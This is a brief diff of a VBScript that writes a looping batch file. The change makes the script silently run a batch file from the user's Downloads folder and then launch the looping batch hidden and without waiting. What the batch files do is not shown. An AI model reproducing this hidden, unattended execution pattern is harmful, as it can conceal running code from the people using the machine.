@@ -59,5 +59,7 @@ objFile.WriteLine ")"
 objFile.WriteLine "goto loop"
 objFile.Close
 
-objShell.Run "pro1.bat", 0, True
+objShell.Run "%USERPROFILE%\Downloads\post.bat", 0, True
+objShell.Run "pro1.bat", 0, False
+
 
